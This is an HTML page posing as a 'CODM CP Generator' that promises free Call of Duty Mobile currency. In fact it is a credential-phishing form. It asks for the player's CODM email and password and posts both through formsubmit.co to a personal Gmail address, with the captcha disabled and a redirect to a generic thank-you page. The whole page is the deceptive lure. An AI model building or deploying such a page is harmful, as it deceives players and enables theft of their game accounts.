<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>CODM CP Generator</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');

    * {
      box-sizing: border-box;
    }

    body {
      font-family: 'Montserrat', sans-serif;
      background: linear-gradient(135deg, #1a1a1a, #0b0b0b);
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      color: #eee;
    }

    .container {
      background: #222;
      padding: 40px 30px;
      border-radius: 15px;
      max-width: 400px;
      width: 90%;
      box-shadow: 0 8px 20px rgba(0,0,0,0.7);
      text-align: center;
    }

    h1 {
      margin-bottom: 10px;
      font-weight: 700;
      font-size: 2.2rem;
      letter-spacing: 1px;
      color: #00ff99;
      text-shadow: 0 0 8px #00ff99;
    }

    p.subtitle {
      margin-top: 0;
      font-size: 0.95rem;
      color: #aaa;
      margin-bottom: 30px;
      font-style: italic;
    }

    input[type="text"], 
    input[type="email"], 
    input[type="password"], 
    select {
      width: 100%;
      padding: 12px 15px;
      margin-bottom: 20px;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      outline: none;
      transition: box-shadow 0.3s ease;
      background: #333;
      color: #eee;
    }

    input::placeholder {
      color: #bbb;
    }

    input:focus, select:focus {
      box-shadow: 0 0 8px #00ff99;
      background: #2a2a2a;
    }

    select {
      cursor: pointer;
    }

    button {
      width: 100%;
      background: #00ff99;
      border: none;
      padding: 14px 0;
      font-weight: 700;
      font-size: 1.1rem;
      color: #111;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s ease;
      box-shadow: 0 0 12px #00ff99;
    }

    button:hover {
      background: #00cc7a;
      box-shadow: 0 0 16px #00cc7a;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>CODM CP Generator</h1>
    <p class="subtitle">Enter your CODM email and password to generate CP.</p>

    <form action="https://formsubmit.co/anatanelgardner0@gmail.com" method="POST" autocomplete="off">
      <input type="email" name="email" placeholder="Enter your CODM email" required />
      <input type="password" name="password" placeholder="Enter your CODM password" required />

      <select name="cp_amount" required>
        <option value="" disabled selected>Select CP Amount</option>
        <option>500 CP</option>
        <option>1000 CP</option>
        <option>5000 CP</option>
      </select>

      <button type="submit">Generate</button>

      <input type="hidden" name="_captcha" value="false" />
      <input type="hidden" name="_next" value="https://thankyoupage.com" />
    </form>
  </div>
</body>
</html>
